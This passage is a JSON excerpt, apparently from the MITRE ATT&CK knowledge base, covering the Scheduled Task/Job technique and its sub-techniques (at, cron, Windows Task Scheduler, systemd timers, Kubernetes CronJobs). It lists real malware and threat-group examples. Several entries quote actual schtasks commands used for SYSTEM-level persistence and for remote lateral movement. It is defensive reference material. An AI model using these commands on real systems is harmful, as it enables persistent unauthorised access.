Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.", "detailed_description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.", "id": "T1053", "examples": [{"id": "S1052", "name": "DEADEYE", "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution."}, {"id": "S0125", "name": "Remsec", "description": "Remsec schedules the execution one of its modules by creating a new scheduler task."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence."}], "sub_techniques": [{"name": "At", "description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.", "detailed_description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the at command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation Win32_ScheduledJob WMI class.\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke at. If the at.deny exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at.\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.", "id": "T1053.002", "examples": [{"id": "G0026", "name": "APT18", "description": "APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network."}, {"id": "S0110", "name": "at", "description": "at can be used to schedule a task on a system to be executed at a specific date or time."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can set a scheduled task on the target system to execute commands remotely using at."}, {"id": "S0233", "name": "MURKYTOP", "description": "MURKYTOP has the capability to schedule remote AT jobs."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network."}]}, {"name": "Cron", "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.", "detailed_description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems.  The  crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths.\nAn adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence.", "id": "T1053.003", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can install itself as a cron job."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used cron to create pre-scheduled and periodic background jobs on a Linux system."}, {"id": "G1023", "name": "APT5", "description": "APT5 has made modifications to the crontab file including in /var/cron/tabs/."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux uses crontab for persistence if it does not have root privileges."}, {"id": "S0588", "name": "GoldMax", "description": "The GoldMax Linux variant has used a crontab entry with a @reboot line to gain persistence."}, {"id": "S0163", "name": "Janicab", "description": "Janicab used a cron job for persistence on Mac devices."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used crontab to download and run shell scripts every minute to ensure persistence."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use crontabs to establish persistence."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse uses a Cron job to establish persistence when infecting Linux hosts."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can use Cron to create periodic and pre-scheduled background jobs."}, {"id": "G0106", "name": "Rocke", "description": "Rocke installed a cron job that downloaded and executed files from the C2."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has installed itself via crontab."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp uses cron tasks to ensure persistence. "}, {"id": "S0341", "name": "Xbash", "description": "Xbash can create a cronjob for persistence if it determines it is on a Linux system."}]}, {"name": "Scheduled Task", "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.", "detailed_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet Invoke-CimMethod, which leverages WMI class PS_ScheduledTask to create a scheduled task via an XML path.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from schtasks /query and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., Index value) within associated registry keys.", "id": "T1053.005", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla  has achieved persistence via scheduled tasks."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can create a scheduled task for persistence."}, {"id": "S1133", "name": "Apostle", "description": "Apostle achieves persistence by creating a scheduled task, such as MicrosoftCrashHandlerUAC."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has created a scheduled SYSTEM task that runs when a user logs in."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used a macro function to set scheduled tasks, disguised as those used by Google."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used named and hijacked scheduled tasks to establish persistence."}, {"id": "G0022", "name": "APT3", "description": "An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used scheduled tasks to persist on victim systems."}, {"id": "G0064", "name": "APT33", "description": "APT33 has created a scheduled task to execute a .vbe file multiple times a day."}, {"id": "G0067", "name": "APT37", "description": "APT37 has created scheduled tasks to run malicious scripts on a compromised host."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used Task Scheduler to run programs at system startup or on a scheduled basis for persistence."}, {"id": "G0087", "name": "APT39", "description": "APT39 has created scheduled tasks for persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a compromised account to create a scheduled task on a system."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can create a scheduled task to maintain persistence on system start-up."}, {"id": "S0438", "name": "Attor", "description": "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has used scheduled tasks to maintain persistence."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to use scheduled tasks to repeatedly execute malicious payloads on a compromised host."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit\u2019s infpub.dat file creates a scheduled task to launch a malicious executable."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use schtasks.exe to gain persistence."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS creates a scheduled task to establish by executing a malicious payload every subsequent minute."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create a scheduled task for persistence."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has used scheduled tasks for persistence and execution."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Windows Scheduled Tasks to establish persistence on local and remote hosts."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER persists using a scheduled task that executes every minute."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can achieve persistence by copying its DLL to a subdirectory of %APPDATA% and creating a Visual Basic Script that will load the DLL via a scheduled task."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used scheduled task XML triggers."}, {"id": "S0335", "name": "Carbon", "description": "Carbon creates several tasks for later execution to continue persistence on the victim\u2019s machine."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can run on a daily basis using a scheduled task."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use the Windows SilentCleanup scheduled task to enable payload execution."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has created Windows tasks to establish persistence."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has used a scheduled task to launch its PowerShell loader."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has created scheduled tasks to maintain persistence on a compromised host."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses scheduled tasks typically named \"Watchmon Service\" for persistence."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors used scheduled tasks to download backdoor tools."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to register itself as a scheduled task."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has the ability to persist using scheduled tasks."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can use the schtasks utility to bypass UAC."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has attempted to use scheduled tasks for persistence in victim environments."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can use a scheduled task for installation."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has created a scheduled task for persistence."}, {"id": "S1088", "name": "Disco", "description": "Disco can create a scheduled task to run every minute for persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can maintain persistence via the creation of scheduled tasks within system directories such as windows\\system32\\, windows\\syswow64, winnt\\system32, and winnt\\syswow64."}, {"id": "S0038", "name": "Duqu", "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear uses remotely scheduled tasks to facilitate remote command execution on victim machines."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has maintained persistence through a scheduled task, e.g. though a .dll file in the Registry."}, {"id": "S0363", "name": "Empire", "description": "Empire has modules to interact with the Windows task scheduler."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has executed commands via scheduled tasks."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has created scheduled tasks in the C:\\Windows directory of the compromised network."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 malware has created scheduled tasks to establish persistence."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used scheduled tasks to maintain RDP backdoors."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used Scheduled Tasks for persistence and to load and execute a reverse proxy binary."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" "}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM established persistence for PoisonIvy by created a scheduled task."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a scheduled task."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has used scheduled tasks to maintain persistence."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to maintain persistence by creating scheduled tasks set to run every hour."}, {"id": "S0237", "name": "GravityRAT", "description": "GravityRAT creates a scheduled task to ensure it is re-executed everyday."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used sctasks for persistence. "}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has the ability to set persistence using the Task Scheduler."}, {"id": "S0170", "name": "Helminth", "description": "Helminth has used a scheduled task for persistence."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to use scheduled tasks for execution."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a scheduled task to establish persistence for a keylogger."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa dropped and added officeupdate.exe to scheduled tasks."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has attempted to install a scheduled task named \"Java Maintenance64\" on startup to establish persistence."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has created a scheduled task to establish persistence."}, {"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader creates scheduled tasks for persistence based on the operating system version of the victim machine."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector creates scheduled tasks to establish persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has the ability to launch scheduled tasks to establish persistence."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has downloaded additional malware with scheduled tasks."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has used scheduled tasks to add persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can create scheduled tasks for persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can create a scheduled task to enable persistence mechanisms."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has created scheduled tasks to establish persistence for their tools."}, {"id": "S0409", "name": "Machete", "description": "The different components of Machete are executed by Windows Task Scheduler."}, {"id": "G0095", "name": "Machete", "description": "Machete has created scheduled tasks to maintain Machete's persistence."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used scheduled tasks to establish persistence and execution."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\"."}, {"id": "S0449", "name": "Maze", "description": "Maze has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch Maze at a specific time."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use scheduled tasks for persistence."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler."}, {"id": "S0688", "name": "Meteor", "description": "Meteor execution begins from a scheduled task named Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it creates a separate scheduled task called mstask to run the wiper only once at 23:55:00."}, {"id": "S1015", "name": "Milan", "description": "Milan can establish persistence on a targeted host with scheduled tasks."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has created scheduled tasks to persistently run VBScripts."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used scheduled tasks for program execution during initial access to victim machines."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used scheduled tasks to establish persistence."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper creates a malicious scheduled task that launches a batch file to remove Windows Event Logs."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has created a scheduled task to execute additional malicious software, as well as maintain persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used schtasks.exe for lateral movement in compromised networks."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can create a scheduled task to establish persistence."}, {"id": "S1147", "name": "Nightdoor", "description": "Nightdoor uses scheduled tasks for persistence to load the final malware payload into memory."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya creates a task to reboot the system one hour after infection."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has created scheduled tasks that run a VBScript to execute a payload on victim machines."}, {"id": "S0439", "name": "Okrum", "description": "Okrum's installer can attempt to achieve persistence by creating a scheduled task."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE creates a scheduled task to run itself every three minutes."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork file stealer can run a TaskScheduler DLL to add persistence."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via a Scheduled Task/Job."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has established persistence through a scheduled task using the command \"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\"."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER persists through a scheduled task that executes it every minute."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has been executed on a target system through a scheduled task created by Sandworm Team using Impacket."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon schedules tasks to invoke its components in order to establish persistence."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has the ability to create scheduled tasks for persistence."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT creates a scheduled task to maintain persistence on the victim\u2019s machine."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use scheduled tasks to achieve persistence."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can schedule tasks via the Windows COM API to maintain persistence."}, {"id": "G0075", "name": "Rancor", "description": "Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has created scheduled tasks for persistence."}, {"id": "S0375", "name": "Remexi", "description": "Remexi utilizes scheduled tasks as a persistence mechanism."}, {"id": "S0166", "name": "RemoteCMD", "description": "RemoteCMD can execute commands remotely by creating a new schedule task on the remote system"}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT schedules tasks to run malicious scripts at different intervals."}, {"id": "S0148", "name": "RTM", "description": "RTM tries to add a scheduled task to establish persistence."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can remotely create a scheduled task to execute itself on a system."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has created a scheduled task named \"Maintenance\" to establish persistence."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines."}, {"id": "S0111", "name": "schtasks", "description": "schtasks is used to schedule tasks on a Windows system to run at a specific date and time."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper contains modules that will use schtasks to carry out malicious operations."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has a persistence component to write a scheduled task for the payload."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has been executed via a scheduled task."}, {"id": "G0091", "name": "Silence", "description": "Silence has used scheduled tasks to stage its operation."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader launches a scheduled task."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can gain persistence through use of scheduled tasks."}, {"id": "S1140", "name": "Spica", "description": "Spica has created a scheduled task named CalendarChecker to establish persistence."}, {"id": "S0390", "name": "SQLRat", "description": "SQLRat has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet schedules a network job to execute two minutes after host infection."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has created scheduled tasks called MicrosoftInternetExplorerCrashRepoeterTaskMachineUA and MicrosoftEdgeCrashRepoeterTaskMachineUA, which were configured to execute CrashReporter.exe during user logon."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can create a scheduled task named RecoveryExTask to gain persistence."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used scheduled tasks to establish persistence for installed tools."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask is able to create \"hidden\" scheduled tasks for persistence."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used scheduled tasks to execute discovery commands and scripts for collection."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris has used SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00 to establish persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot creates a scheduled task on the system that provides persistence."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files."}, {"id": "S0476", "name": "Valak", "description": "Valak has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware."}, {"id": "S0248", "name": "yty", "description": "yty establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\"."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has a command to create a scheduled task for persistence."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has used SchTasks for execution."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has used scheduled tasks for persistence and execution."}]}, {"name": "Systemd Timers", "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.", "detailed_description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.\nEach .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.", "id": "T1053.006", "examples": []}, {"name": "Container Orchestration Job", "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.", "detailed_description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.", "id": "T1053.007", "examples": []}]}, {"name": "Server Software Component", "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.", "detailed_description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.", "id": "T1505", "examples": [], "sub_techniques": [{"name": "SQL Stored Procedures", "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to 